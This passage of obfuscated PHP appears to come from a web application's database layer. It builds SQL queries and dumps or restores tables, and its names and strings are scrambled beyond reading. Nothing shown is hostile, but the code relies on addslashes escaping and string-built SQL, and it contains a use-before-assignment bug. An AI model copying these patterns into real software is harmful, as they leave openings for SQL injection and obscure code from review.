$this->exp[$óüâüöµ] . $·éœ©î…[53] . $°¾Ãßƒ™[1]; } else { if (is_string($°¾Ãßƒ™[1])) { $°¾Ãßƒ™[1] = explode($·éœ©î…[50], $°¾Ãßƒ™[1]); } $’òÀ×â‰ = implode($·éœ©î…[50], $this->parseValue($°¾Ãßƒ™[1])); $¯¶ƒ¼Ò‘ .= $—Ğå‰²× . $·éœ©î…[53] . $this->exp[$óüâüöµ] . $·éœ©î…[982] . $’òÀ×â‰ . $·éœ©î…[984]; } } elseif (preg_match($·éœ©î…[1100], $°¾Ãßƒ™[0])) { $’ÌÚ…‹› = is_string($°¾Ãßƒ™[1]) ? explode($·éœ©î…[50], $°¾Ãßƒ™[1]) : $°¾Ãßƒ™[1]; $¯¶ƒ¼Ò‘ .= $·éœ©î…[982] . $—Ğå‰²× . $·éœ©î…[53] . $this->exp[$óüâüöµ] . $·éœ©î…[53] . $this->parseValue($’ÌÚ…‹›[0]) . $·éœ©î…[1083] . $this->parseValue($’ÌÚ…‹›[1]) . $·éœ©î…[355]; } else { think_exception(think_lang($·éœ©î…[1086]) . $·éœ©î…[4] . $°¾Ãßƒ™[0]); } } else { $½§ğâ¾´ = count($°¾Ãßƒ™); $Ô™°êÃ° = $·éœ©î…[12]; if (is_string($°¾Ãßƒ™[$½§ğâ¾´ - 1])) { $Ô™°êÃ° = isset($°¾Ãßƒ™[$½§ğâ¾´ - 1]) ? strtoupper($°¾Ãßƒ™[$½§ğâ¾´ - 1]) : $·éœ©î…[12]; if (in_array($Ô™°êÃ°, array($·éœ©î…[1080], $·éœ©î…[1081], $·éœ©î…[1082]))) { $½§ğâ¾´ = $½§ğâ¾´ - 1; } } else { $Ô™°êÃ° = $·éœ©î…[1080]; } for ($­¼›±¤– = 0; $­¼›±¤– < $½§ğâ¾´; $­¼›±¤–++) { $’ÌÚ…‹› = is_array($°¾Ãßƒ™[$­¼›±¤–]) ? $°¾Ãßƒ™[$­¼›±¤–][1] : $°¾Ãßƒ™[$­¼›±¤–]; if ($·éœ©î…[373] == strtolower($°¾Ãßƒ™[$­¼›±¤–][0])) { $¯¶ƒ¼Ò‘ .= $·éœ©î…[337] . $—Ğå‰²× . $·éœ©î…[53] . $’ÌÚ…‹› . $·éœ©î…[1097] . $Ô™°êÃ° . $·éœ©î…[53]; } else { $”êø€° = is_array($°¾Ãßƒ™[$­¼›±¤–]) ? $this->exp[strtolower($°¾Ãßƒ™[$­¼›±¤–][0])] : $·éœ©î…[963]; if (!$”êø€° && is_array($°¾Ãßƒ™[$­¼›±¤–]) && in_array($°¾Ãßƒ™[$­¼›±¤–][0], array($·éœ©î…[963], $·éœ©î…[1090], $·éœ©î…[1091], $·éœ©î…[1092], $·éœ©î…[1093], $·éœ©î…[1094]))) { $”êø€° = $°¾Ãßƒ™[$­¼›±¤–][0]; } $¯¶ƒ¼Ò‘ .= $·éœ©î…[337] . $—Ğå‰²× . $·éœ©î…[53] . $”êø€° . $·éœ©î…[53] . $this->parseValue($’ÌÚ…‹›) . $·éœ©î…[1097] . $Ô™°êÃ° . $·éœ©î…[53]; } } $¯¶ƒ¼Ò‘ = substr($¯¶ƒ¼Ò‘, 0, -4); } } else { $¯¶ƒ¼Ò‘ .= $—Ğå‰²× . $·éœ©î…[1101] . $this->parseValue($°¾Ãßƒ™); } return $¯¶ƒ¼Ò‘; } protected function parseThinkWhere($ŒğÈ•ßò, $Ûä§°šŒ) { $¼ÔÌı†è =& $_SERVER[ç¦¬”œš]; $Ó¨‰ˆğ = $¼ÔÌı†è[12]; switch ($ŒğÈ•ßò) { case $¼ÔÌı†è[428]: $Ó¨‰ˆğ = $Ûä§°šŒ; break; case $¼ÔÌı†è[1084]: $Ó¨‰ˆğ = is_string($Ûä§°šŒ) ? $Ûä§°šŒ : substr($this->parseWhere($Ûä§°šŒ), 6); break; case $¼ÔÌı†è[1102]: parse_str($Ûä§°šŒ, $Çıõ—èÉ); if (isset($Çıõ—èÉ[$¼ÔÌı†è[1079]])) { $íòË°ì› = $¼ÔÌı†è[53] . strtoupper($Çıõ—èÉ[$¼ÔÌı†è[1079]]) . $¼ÔÌı†è[53]; unset($Çıõ—èÉ[$¼ÔÌı†è[1079]]); } else { $íòË°ì› = $¼ÔÌı†è[1083]; } $Ğ³óŞ¦˜ = array(); foreach ($Çıõ—èÉ as $±¿‚Âšº => $ªÍöš–û) { $Ğ³óŞ¦˜[] = $this->parseKey($±¿‚Âšº) . $¼ÔÌı†è[1101] . $this->parseValue($ªÍöš–û); } $Ó¨‰ˆğ = implode($íòË°ì›, $Ğ³óŞ¦˜); break; } return $Ó¨‰ˆğ; } protected function parseLimit($‹Ùú‚ˆÑ) { $ì­ÖÕÛÖ =& $_SERVER[ç¦¬”œš]; return !empty($‹Ùú‚ˆÑ) ? $ì­ÖÕÛÖ[51] . $‹Ùú‚ˆÑ . $ì­ÖÕÛÖ[53] : $ì­ÖÕÛÖ[12]; } protected function parseJoin($®ƒã€Ş×) { $ïÕ»²£ =& $_SERVER[ç¦¬”œš]; $¹¸í¼¦† = $ïÕ»²£[12]; if (!empty($®ƒã€Ş×)) { if (is_array($®ƒã€Ş×)) { foreach ($®ƒã€Ş× as $ÃÓ§’Á— => $¹‘·Ş˜ü) { if (!1 !== stripos($¹‘·Ş˜ü, $ïÕ»²£[1103])) { $¹¸í¼¦† .= $ïÕ»²£[53] . $¹‘·Ş˜ü; } else { $¹¸í¼¦† .= $ïÕ»²£[1104] . $¹‘·Ş˜ü; } } } else { $¹¸í¼¦† .= $ïÕ»²£[1104] . $®ƒã€Ş×; } } $¹¸í¼¦† = preg_replace($ïÕ»²£[1105], think_config($ïÕ»²£[1009]) . $ïÕ»²£[1106], $¹¸í¼¦†); return $¹¸í¼¦†; } protected function parseOrder($ĞŸ¾Ëß™) { $Æúêßµ¨ =& $_SERVER[ç¦¬”œš]; if (is_array($ĞŸ¾Ëß™)) { $ÁÁÚÏù© = array(); foreach ($ĞŸ¾Ëß™ as $ş™öáÖÍ => $Ü”Á´÷ê) { if (is_numeric($ş™öáÖÍ)) { $ÁÁÚÏù©[] = $this->parseKey($Ü”Á´÷ê); } else { $Ü”Á´÷ê = in_array(strtoupper(trim($Ü”Á´÷ê)), array($Æúêßµ¨[1107], $Æúêßµ¨[1108])) ? $Æúêßµ¨[53] . $Ü”Á´÷ê : $Æúêßµ¨[12]; if (preg_match($Æúêßµ¨[1109], $ş™öáÖÍ)) { $ÁÁÚÏù©[] = $this->parseKey($ş™öáÖÍ) . $Ü”Á´÷ê; } else { think_exception($Æúêßµ¨[1110] . $ş™öáÖÍ); } } } $ĞŸ¾Ëß™ = implode($Æúêßµ¨[50], $ÁÁÚÏù©); } return !empty($ĞŸ¾Ëß™) ? $Æúêßµ¨[1111] . $ĞŸ¾Ëß™ : $Æúêßµ¨[12]; } protected function parseGroup($šğøïò˜) { $«£Øì‚’ =& $_SERVER[ç¦¬”œš]; return !empty($šğøïò˜) ? $«£Øì‚’[1112] . $šğøïò˜ : $«£Øì‚’[12]; } protected function parseHaving($Õ¿µ§ÙÑ) { $âïíô¬ß =& $_SERVER[ç¦¬”œš]; return !empty($Õ¿µ§ÙÑ) ? $âïíô¬ß[1113] . $Õ¿µ§ÙÑ : $âïíô¬ß[12]; } protected function parseComment($æĞÀÃÈ) { $™¶”ã›Ü =& $_SERVER[ç¦¬”œš]; return !empty($æĞÀÃÈ) ? $™¶”ã›Ü[1114] . $æĞÀÃÈ . $™¶”ã›Ü[1115] : $™¶”ã›Ü[12]; } protected function parseDistinct($„øÜ¦ƒá) { $äÎÁ¯®ó =& $_SERVER[ç¦¬”œš]; return !empty($„øÜ¦ƒá) ? $äÎÁ¯®ó[1116] : $äÎÁ¯®ó[12]; } protected function parseUnion($ìª–ÛÔ”) { $«öë×À =& $_SERVER[ç¦¬”œš]; if (empty($ìª–ÛÔ”)) { return $«öë×À[12]; } if (isset($ìª–ÛÔ”[$«öë×À[424]])) { $ü¢é¢ô¾ = $«öë×À[1117]; unset($ìª–ÛÔ”[$«öë×À[424]]); } else { $ü¢é¢ô¾ = $«öë×À[1118]; } foreach ($ìª–ÛÔ” as $‹ùÚÅÎ) { $ı×‚—ğç[] = $ü¢é¢ô¾ . (is_array($‹ùÚÅÎ) ? $this->buildSelectSql($‹ùÚÅÎ) : $‹ùÚÅÎ); } return implode($«öë×À[53], $ı×‚—ğç); } public function insert($©Ï¢Ñ´¯, $ÖÎÏ°Ú‘ = array(), $¼ •¾ÀŒ = false) { $‹êƒ‚ÀÖ =& $_SERVER[ç¦¬”œš]; $Áç¬êı = $âÂ†ğÙ  = array(); $this->model = $ÖÎÏ°Ú‘[$‹êƒ‚ÀÖ[358]]; foreach ($©Ï¢Ñ´¯ as $ìù…‰Ö => $ƒÙÊÄ¨–) { if (is_array($ƒÙÊÄ¨–) && $‹êƒ‚ÀÖ[373] == $ƒÙÊÄ¨–[0]) { $âÂ†ğÙ [] = $this->parseKey($ìù…‰Ö); $Áç¬êı[] = $ƒÙÊÄ¨–[1]; } elseif (is_scalar($ƒÙÊÄ¨–) || is_null($ƒÙÊÄ¨–)) { $âÂ†ğÙ [] = $this->parseKey($ìù…‰Ö); $Áç¬êı[] = $this->parseValue($ƒÙÊÄ¨–); } } $©©ÀÆï± = ($¼ •¾ÀŒ ? $‹êƒ‚ÀÖ[986] : $‹êƒ‚ÀÖ[987]) . $‹êƒ‚ÀÖ[988] . $this->parseTable($ÖÎÏ°Ú‘[$‹êƒ‚ÀÖ[356]]) . $‹êƒ‚ÀÖ[982] . implode($‹êƒ‚ÀÖ[50], $âÂ†ğÙ ) . $‹êƒ‚ÀÖ[983] . implode($‹êƒ‚ÀÖ[50], $Áç¬êı) . $‹êƒ‚ÀÖ[984]; $©©ÀÆï± .= $this->parseLock(isset($ÖÎÏ°Ú‘[$‹êƒ‚ÀÖ[923]]) ? $ÖÎÏ°Ú‘[$‹êƒ‚ÀÖ[923]] : !1); $©©ÀÆï± .= $this->parseComment(!empty($ÖÎÏ°Ú‘[$‹êƒ‚ÀÖ[430]]) ? $ÖÎÏ°Ú‘[$‹êƒ‚ÀÖ[430]] : $‹êƒ‚ÀÖ[12]); return $this->execute($©©ÀÆï±, $this->parseBind(!empty($ÖÎÏ°Ú‘[$‹êƒ‚ÀÖ[361]]) ? $ÖÎÏ°Ú‘[$‹êƒ‚ÀÖ[361]] : array())); } public function selectInsert($ÂãŞ§ŸŒ, $éì‚ë²›, $İÆµ±¡ş = array()) { $½Ïé›Ô =& $_SERVER[ç¦¬”œš]; $this->model = $İÆµ±¡ş[$½Ïé›Ô[358]]; if (is_string($ÂãŞ§ŸŒ)) { $ÂãŞ§ŸŒ = explode($½Ïé›Ô[50], $ÂãŞ§ŸŒ); } array_walk($ÂãŞ§ŸŒ, array($this, $½Ïé›Ô[985])); $ÔÏáÔ˜ = $½Ïé›Ô[1119] . $this->parseTable($éì‚ë²›) . $½Ïé›Ô[982] . implode($½Ïé›Ô[50], $ÂãŞ§ŸŒ) . $½Ïé›Ô[1097]; $ÔÏáÔ˜ .= $this->buildSelectSql($İÆµ±¡ş); return $this->execute($ÔÏáÔ˜, $this->parseBind(!empty($İÆµ±¡ş[$½Ïé›Ô[361]]) ? $İÆµ±¡ş[$½Ïé›Ô[361]] : array())); } public function update($ùºÑ¡Ÿš, $‰ÄÃ™Óº) { $î÷Óèïş =& $_SERVER[ç¦¬”œš]; $this->model = $‰ÄÃ™Óº[$î÷Óèïş[358]]; $Ê±‘·‹ê = $î÷Óèïş[1120] . $this->parseTable($‰ÄÃ™Óº[$î÷Óèïş[356]]) . $this->parseSet($ùºÑ¡Ÿš) . $this->parseWhere(!empty($‰ÄÃ™Óº[$î÷Óèïş[352]]) ? $‰ÄÃ™Óº[$î÷Óèïş[352]] : $î÷Óèïş[12]) . $this->parseOrder(!empty($‰ÄÃ™Óº[$î÷Óèïş[441]]) ? $‰ÄÃ™Óº[$î÷Óèïş[441]] : $î÷Óèïş[12]) . $this->parseLimit(!empty($‰ÄÃ™Óº[$î÷Óèïş[368]]) ? $‰ÄÃ™Óº[$î÷Óèïş[368]] : $î÷Óèïş[12]) . $this->parseLock(isset($‰ÄÃ™Óº[$î÷Óèïş[923]]) ? $‰ÄÃ™Óº[$î÷Óèïş[923]] : !1) . $this->parseComment(!empty($‰ÄÃ™Óº[$î÷Óèïş[430]]) ? $‰ÄÃ™Óº[$î÷Óèïş[430]] : $î÷Óèïş[12]); return $this->execute($Ê±‘·‹ê, $this->parseBind(!empty($‰ÄÃ™Óº[$î÷Óèïş[361]]) ? $‰ÄÃ™Óº[$î÷Óèïş[361]] : array())); } public function delete($ğç½İÊ = array()) { $€¸ô”è£ =& $_SERVER[ç¦¬”œš]; $this->model = $ğç½İÊ[$€¸ô”è£[358]]; $œó¬€ÈØ = $€¸ô”è£[1121] . $this->parseTable($ğç½İÊ[$€¸ô”è£[356]]) . $this->parseWhere(!empty($ğç½İÊ[$€¸ô”è£[352]]) ? $ğç½İÊ[$€¸ô”è£[352]] : $€¸ô”è£[12]) . $this->parseOrder(!empty($ğç½İÊ[$€¸ô”è£[441]]) ? $ğç½İÊ[$€¸ô”è£[441]] : $€¸ô”è£[12]) . $this->parseLimit(!empty($ğç½İÊ[$€¸ô”è£[368]]) ? $ğç½İÊ[$€¸ô”è£[368]] : $€¸ô”è£[12]) . $this->parseLock(isset($ğç½İÊ[$€¸ô”è£[923]]) ? $ğç½İÊ[$€¸ô”è£[923]] : !1) . $this->parseComment(!empty($ğç½İÊ[$€¸ô”è£[430]]) ? $ğç½İÊ[$€¸ô”è£[430]] : $€¸ô”è£[12]); return $this->execute($œó¬€ÈØ, $this->parseBind(!empty($ğç½İÊ[$€¸ô”è£[361]]) ? $ğç½İÊ[$€¸ô”è£[361]] : array())); } public function select($äÕä­Ê = array()) { $–»¥â‰ã =& $_SERVER[ç¦¬”œš]; $this->model = $äÕä­Ê[$–»¥â‰ã[358]]; $ĞÄßæƒç = $this->buildSelectSql($äÕä­Ê); $æØ„®óÎ = isset($äÕä­Ê[$–»¥â‰ã[425]]) ? $äÕä­Ê[$–»¥â‰ã[425]] : !1; if ($æØ„®óÎ) { $åª ÊŸ… = is_string($æØ„®óÎ[$–»¥â‰ã[97]]) ? $æØ„®óÎ[$–»¥â‰ã[97]] : $–»¥â‰ã[1122] . md5($ĞÄßæƒç); $ú½ š€Ù = think_cache($åª ÊŸ…, $–»¥â‰ã[12], $æØ„®óÎ); if (!1 !== $ú½ š€Ù) { return $ú½ š€Ù; } } $ÙÒ‘Ğæ = $this->query($ĞÄßæƒç, $this->parseBind(!empty($äÕä­Ê[$–»¥â‰ã[361]]) ? $äÕä­Ê[$–»¥â‰ã[361]] : array())); if ($æØ„®óÎ && !1 !== $ÙÒ‘Ğæ) { think_cache($åª ÊŸ…, $ÙÒ‘Ğæ, $æØ„®óÎ); } return $ÙÒ‘Ğæ; } public function buildSelectSql($Óˆµº€² = array()) { $¦ØµÃğ¡ =& $_SERVER[ç¦¬”œš]; if (isset($Óˆµº€²[$¦ØµÃğ¡[429]])) { if (strpos($Óˆµº€²[$¦ØµÃğ¡[429]], $¦ØµÃğ¡[50])) { list($…‚§Ÿ², $„×• Á) = explode($¦ØµÃğ¡[50], $Óˆµº€²[$¦ØµÃğ¡[429]]); } else { $…‚§Ÿ² = $Óˆµº€²[$¦ØµÃğ¡[429]]; } $…‚§Ÿ² = $…‚§Ÿ² ? $…‚§Ÿ² : 1; $„×• Á = isset($„×• Á) ? $„×• Á : (is_numeric($Óˆµº€²[$¦ØµÃğ¡[368]]) ? $Óˆµº€²[$¦ØµÃğ¡[368]] : 20); $ĞÀƒşØ¼ = $„×• Á * ((int) $…‚§Ÿ² - 1); $Óˆµº€²[$¦ØµÃğ¡[368]] = $ĞÀƒşØ¼ . $¦ØµÃğ¡[50] . $„×• Á; } if (think_config($¦ØµÃğ¡[1123])) { $Ò„€°şÂ = $¦ØµÃğ¡[1124] . md5(serialize($Óˆµº€²)); $²İì¯ÑÕ = think_cache($Ò„€°şÂ); if ($²İì¯ÑÕ) { return $²İì¯ÑÕ; } } $ÆÀ”ìúß = $this->parseSql($this->selectSql, $Óˆµº€²); $ÆÀ”ìúß .= $this->parseLock(isset($Óˆµº€²[$¦ØµÃğ¡[923]]) ? $Óˆµº€²[$¦ØµÃğ¡[923]] : !1); if (isset($Ò„€°şÂ)) { think_cache($Ò„€°şÂ, $ÆÀ”ìúß); } return $ÆÀ”ìúß; } public function parseSql($ûû¡¦£ø, $“ãÈÍÖã = array()) { $¡–½½°Ä =& $_SERVER[ç¦¬”œš]; $ûû¡¦£ø = str_replace(array($¡–½½°Ä[1125], $¡–½½°Ä[1126], $¡–½½°Ä[1127], $¡–½½°Ä[1128], $¡–½½°Ä[1129], $¡–½½°Ä[1130], $¡–½½°Ä[1131], $¡–½½°Ä[1132], $¡–½½°Ä[1133], $¡–½½°Ä[1134], $¡–½½°Ä[1135]), array($this->parseTable("{$“ãÈÍÖã[$¡–½½°Ä[356]]}"), $this->parseDistinct(isset($“ãÈÍÖã[$¡–½½°Ä[1136]]) ? $“ãÈÍÖã[$¡–½½°Ä[1136]] : !1), $this->parseField(!empty($“ãÈÍÖã[$¡–½½°Ä[350]]) ? $“ãÈÍÖã[$¡–½½°Ä[350]] : $¡–½½°Ä[220]), $this->parseJoin(!empty($“ãÈÍÖã[$¡–½½°Ä[359]]) ? $“ãÈÍÖã[$¡–½½°Ä[359]] : $¡–½½°Ä[12]), $this->parseWhere(!empty($“ãÈÍÖã[$¡–½½°Ä[352]]) ? $“ãÈÍÖã[$¡–½½°Ä[352]] : $¡–½½°Ä[12]), $this->parseGroup(!empty($“ãÈÍÖã[$¡–½½°Ä[587]]) ? $“ãÈÍÖã[$¡–½½°Ä[587]] : $¡–½½°Ä[12]), $this->parseHaving(!empty($“ãÈÍÖã[$¡–½½°Ä[1137]]) ? $“ãÈÍÖã[$¡–½½°Ä[1137]] : $¡–½½°Ä[12]), $this->parseOrder(!empty($“ãÈÍÖã[$¡–½½°Ä[441]]) ? $“ãÈÍÖã[$¡–½½°Ä[441]] : $¡–½½°Ä[12]), $this->parseLimit(!empty($“ãÈÍÖã[$¡–½½°Ä[368]]) ? $“ãÈÍÖã[$¡–½½°Ä[368]] : $¡–½½°Ä[12]), $this->parseUnion(!empty($“ãÈÍÖã[$¡–½½°Ä[423]]) ? $“ãÈÍÖã[$¡–½½°Ä[423]] : $¡–½½°Ä[12]), $this->parseComment(!empty($“ãÈÍÖã[$¡–½½°Ä[430]]) ? $“ãÈÍÖã[$¡–½½°Ä[430]] : $¡–½½°Ä[12])), $ûû¡¦£ø); return $ûû¡¦£ø; } public function getLastSql($Í¯”İ„ = '') { return $Í¯”İ„ ? $this->modelSql[$Í¯”İ„] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($‹ŒÃŞı) { return addslashes($‹ŒÃŞı); } public function setModel($ü„ôºª‹) { $this->model = $ü„ôºª‹; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($÷ôß‚¬ = array()) { $¯äŒÚü =& $_SERVER[ç¦¬”œš]; if (empty($÷ôß‚¬)) { $÷ôß‚¬ = $GLOBALS[$¯äŒÚü[6]][$¯äŒÚü[21]]; } $this->database = $÷ôß‚¬; } public function model($ïÚÛºÚÛ = '') { return new ModelBase($ïÚÛºÚÛ, $_SERVER[ç¦¬”œš][12], $this->database); } public function db($ÎÄÁÀŸ = false) { $€¶„¦Í =& $_SERVER[ç¦¬”œš]; $¸ë‚ÕÆÄ = array_change_key_case($this->database); if ($this->dbType() == $€¶„¦Í[13] || !$ÎÄÁÀŸ) { return $this->model()->db(); } $ØåõÙ÷ï = $¸ë‚ÕÆÄ[$€¶„¦Í[1051]]; $¸ë‚ÕÆÄ[$€¶„¦Í[1051]] = $€¶„¦Í[12]; if ($¸ë‚ÕÆÄ[$€¶„¦Í[1046]] == $€¶„¦Í[1043]) { $†”ÆÖÜ = $¸ë‚ÕÆÄ[$€¶„¦Í[1052]]; $¸ë‚ÕÆÄ[$€¶„¦Í[1052]] = substr($†”ÆÖÜ, 0, strrpos($†”ÆÖÜ, $€¶„¦Í[1138])); } $this->database = $¸ë‚ÕÆÄ; $°ó·Ô” = $this->model()->db(); try { $Àèğ„Î¸ = $°ó·Ô”->execute("\x73\150\x6f\x77\40\144\x61\164\141\x62\x61\x73\x65\163\x20\x6c\x69\153\x65\x20\x27{$ØåõÙ÷ï}\47"); } catch (Exception $€Ã‹Õ°¨) { } if (!$Àèğ„Î¸) { $°ó·Ô”->execute("\143\x72\145\x61\x74\x65\40\x64\x61\x74\141\x62\x61\x73\145\40\x60{$ØåõÙ÷ï}\140"); } $¸ë‚ÕÆÄ[$€¶„¦Í[1051]] = $ØåõÙ÷ï; if ($¸ë‚ÕÆÄ[$€¶„¦Í[1046]] == $€¶„¦Í[1043]) { $¸ë‚ÕÆÄ[$€¶„¦Í[1052]] .= $€¶„¦Í[1138] . $ØåõÙ÷ï; } $this->database = $¸ë‚ÕÆÄ; $°ó·Ô”->execute("\165\x73\145\x20\x60{$ØåõÙ÷ï}\x60"); return $°ó·Ô”; } public function createTable($ÎÂ®–ö¬, &$˜»ò¡) { $äÁÀò­ =& $_SERVER[ç¦¬”œš]; if (!IO::exist($ÎÂ®–ö¬)) { ActionCall($äÁÀò­[1139], !0, 0); show_json(LNG($äÁÀò­[1140]), !1); } $‚…ŒÕÓÌ = $this->model()->db(); $±íÏ¿şÃ = sqlSplit(IO::getContent($ÎÂ®–ö¬)); foreach ($±íÏ¿şÃ as $®øÛÜ¼È) { $Î¹çÖ• = stripos($®øÛÜ¼È, $äÁÀò­[1141]) === 0; if ($Î¹çÖ•) { $˜»ò¡->task[$äÁÀò­[1142]] += 1; } $‚…ŒÕÓÌ->execute($®øÛÜ¼È); if ($Î¹çÖ•) { preg_match($äÁÀò­[1143], $®øÛÜ¼È, $»Á¼Òè€); $˜»ò¡->task[$äÁÀò­[1144]] = $»Á¼Òè€[1]; $˜»ò¡->update(1); } } } public function insertTable($æÖôî”Ç, &$°âí¡‰Ğ) { $±¯ºÀÕĞ =& $_SERVER[ç¦¬”œš]; $£ûÖ„şĞ = $this->model()->db(); $ÒˆÊå‘Û = $É…õÊØ¥ ? array($É…õÊØ¥) : $£ûÖ„şĞ->getTables(); foreach ($æÖôî”Ç as $’ĞÕ©à) { $É…õÊØ¥ = basename($’ĞÕ©à, $±¯ºÀÕĞ[868]); if (!in_array($É…õÊØ¥, $ÒˆÊå‘Û)) { continue; } $°âí¡‰Ğ->task[$±¯ºÀÕĞ[1144]] = $É…õÊØ¥; if (get_filesize($’ĞÕ©à) == 0) { continue; } $›¿ğíØÁ = $this->sqlToDb($’ĞÕ©à, $°âí¡‰Ğ); if (!$›¿ğíØÁ) { ActionCall($±¯ºÀÕĞ[1139], !0, 0); show_json(LNG($±¯ºÀÕĞ[1145]) . "\x5b{$É…õÊØ¥}\135", !1); } } } public function sqlFromDb($°£µÖŞÊ, $ıô¯íÁû, &$•§ıÏ¸, $ç›¸°Á¼ = '') { if ($•§ıÏ¸) { $•§ıÏ¸->task[$_SERVER[ç¦¬”œš][1144]] = $°£µÖŞÊ; } $³‚»ÓÄÆ = $this->model($°£µÖŞÊ); $©‹¥ƒ£Î = 0; $êôÛéö = 0; $›· ¶ó = 10000; $ˆè³ÒÊÂ = fopen($ıô¯íÁû, $_SERVER[ç¦¬”œš][1146]); $±éÄ­øã = $³‚»ÓÄÆ->getPk(); $°İ»Óï = $³‚»ÓÄÆ->getDbFields(); $Šâ¡”ıŸ = $_SERVER[ç¦¬”œš][12]; if ($GLOBALS[$_SERVER[ç¦¬”œš][867]] && in_array($°£µÖŞÊ, array($_SERVER[ç¦¬”œš][1147], $_SERVER[ç¦¬”œš][1148]))) { $Šâ¡”ıŸ = $°£µÖŞÊ; } do { $ëÙÔâÀí = array($±éÄ­øã => array($_SERVER[ç¦¬”œš][1093], $êôÛéö)); $µ£ßÏùˆ = $³‚»ÓÄÆ->where($ëÙÔâÀí)->field($°İ»Óï)->order($±éÄ­øã . $_SERVER[ç¦¬”œš][1149])->limit($›· ¶ó)->select(); $µ£ßÏùˆ = !empty($µ£ßÏùˆ) ? $µ£ßÏùˆ : array(); if (!($ÙõÏ† = count($µ£ßÏùˆ))) { break; } $‡™Ÿ×²½ = end($µ£ßÏùˆ); $êôÛéö = $‡™Ÿ×²½[$±éÄ­øã]; $¨Ê°ù” = array(); foreach ($µ£ßÏùˆ as $üŸş‰Üû) { if ($Šâ¡”ıŸ) { if ($°£µÖŞÊ == $_SERVER[ç¦¬”œš][1147]) { if ($üŸş‰Üû[$_SERVER[ç¦¬”œš][33]] == $_SERVER[ç¦¬”œš][1150]) { $–ÎŒ»¹ù = json_decode($üŸş‰Üû[$_SERVER[ç¦¬”œš][450]], !0); if ($–ÎŒ»¹ù[$_SERVER[ç¦¬”œš][32]] == $GLOBALS[$_SERVER[ç¦¬”œš][867]] && $–ÎŒ»¹ù[$_SERVER[ç¦¬”œš][830]] != 1) { continue; } } } else { if ($üŸş‰Üû[$_SERVER[ç¦¬”œš][33]] == $_SERVER[ç¦¬”œš][1151] && $üŸş‰Üû[$_SERVER[ç¦¬”œš][97]] == $_SERVER[ç¦¬”œš][862]) { continue; } } } if ($ç›¸°Á¼) { $üŸş‰Üû[$_SERVER[ç¦¬”œš][87]] = "\173\151\157\x3a{$ç›¸°Á¼}\175" . substr($üŸş‰Üû[$_SERVER[ç¦¬”œš][87]], strlen("\x7b\151\157\x3a{$üŸş‰Üû[$_SERVER[ç¦¬”œš][897]]}\175")); $üŸş‰Üû[$_SERVER[ç¦¬”œš][897]] = $ç›¸°Á¼; } $¨Ê°ù”[] = $_SERVER[ç¦¬”œš][1152] . $this->sqlEncode($üŸş‰Üû) . $_SERVER[ç¦¬”œš][1153]; } $ä«®¶›¾ = "\111\116\123\x45\x52\x54\x20\111\x4e\x54\117\40\140{$°£µÖŞÊ}\x60\x20\50\140" . implode($_SERVER[ç¦¬”œš][1154], $°İ»Óï) . $_SERVER[ç¦¬”œš][1155]; fwrite($ˆè³ÒÊÂ, $ä«®¶›¾ . implode($_SERVER[ç¦¬”œš][1156], $¨Ê°ù”) . $_SERVER[ç¦¬”œš][74] . PHP_EOL); $©‹¥ƒ£Î += $ÙõÏ†; if ($•§ıÏ¸) { $•§ıÏ¸->update($ÙõÏ†); } } while ($›· ¶ó == $ÙõÏ†); fclose($ˆè³ÒÊÂ); return $©‹¥ƒ£Î; } public function sqlToDb($š†¦âÇÖ, &$¹Œ«š¤Ç) { $³©Ï®ˆà =& $_SERVER[ç¦¬”œš]; $èŒîƒ±¶ = $this->model()->db(); $Ò¹²ÍÂ¹ = @fopen($š†¦âÇÖ, $³©Ï®ˆà[1157]); if (!$Ò¹²ÍÂ¹) { return !1; } $¼íÎ¦á = 0; $ÀäÉ² = $³©Ï®ˆà[12]; $¼‚Šıá™ = array(); $«·ÆâõÀ = $this->dbType(); $°ïéÄ‡Ø = $«·ÆâõÀ == $³©Ï®ˆà[13] ? 500 : 2000; $õÜ¤¯ã¢ = basename($š†¦âÇÖ, $³©Ï®ˆà[868]); $í†Ñ¥óú = 0; $™‘şÇÃ = 4194304; while (!feof($Ò¹²ÍÂ¹)) { $õÒ•¦ëÅ = trim(fgets($Ò¹²ÍÂ¹)); if (!$õÒ•¦ëÅ) { continue; } $·‚ã«Ê = $this->sqlDecode($õÒ•¦ëÅ, $«·ÆâõÀ, $õÜ¤¯ã¢); if (stripos($·‚ã«Ê, $³©Ï®ˆà[431]) === 0) { if (!$ÀäÉ²) { $ÀäÉ² = $·‚ã«Ê . $³©Ï®ˆà[53]; } continue; } if ($¹Œ«š¤Ç) { $¹Œ«š¤Ç->task[$³©Ï®ˆà[1142]] += 1; } $¼íÎ¦á++; $¼‚Šıá™[] = rtrim(rtrim(trim($·‚ã«Ê), $³©Ï®ˆà[50]), $³©Ï®ˆà[74]); $­ø†¾¤ = null; $íçÔ˜Ìô = strlen($·‚ã«Ê); $í†Ñ¥óú += $íçÔ˜Ìô; $È¤ùÒˆ® = strlen($ÀäÉ²) + $í†Ñ¥óú + (count($¼‚Šıá™) - 1); if ($È¤ùÒˆ® >= $™‘şÇÃ) { $­ø†¾¤ = array_pop($¼‚Šıá™); if ($¼íÎ¦á > 1) { $¼íÎ¦á--; } } if ($¼íÎ¦á >= $°ïéÄ‡Ø || $­ø†¾¤) { $·‚ã«Ê = $ÀäÉ² . implode($³©Ï®ˆà[50], $¼‚Šıá™); if (!$èŒîƒ±¶->execute($·‚ã«Ê)) { return !1; } if ($¹Œ«š¤Ç) { $¹Œ«š¤Ç->update($¼íÎ¦á); } $¼‚Šıá™ = array(); $¼íÎ¦á = 0; $í†Ñ¥óú = 0; if ($­ø†¾¤) { $¼‚Šıá™ = array($­ø†¾¤); $¼íÎ¦á = 1; $í†Ñ¥óú = $íçÔ˜Ìô; } } } fclose($Ò¹²ÍÂ¹); if (!empty($¼‚Šıá™)) { $·‚ã«Ê = $ÀäÉ² . implode($³©Ï®ˆà[50], $¼‚Šıá™); if (!$èŒîƒ±¶->execute($·‚ã«Ê)) { return !1; } if ($¹Œ«š¤Ç) { $¹Œ«š¤Ç->update($¼íÎ¦á); } } return !0; } public function dropTable($§ğÉ˜Ğû = null) { $‘©êÜÈ = $this->model()->db(); $Ã¾€±îô = $§ğÉ˜Ğû ? array($§ğÉ˜Ğû) : $‘©êÜÈ->getTables(); if (!$Ã¾€±îô) { return; } foreach ($Ã¾€±îô as $§ğÉ˜Ğû) { if ($§ğÉ˜Ğû) { 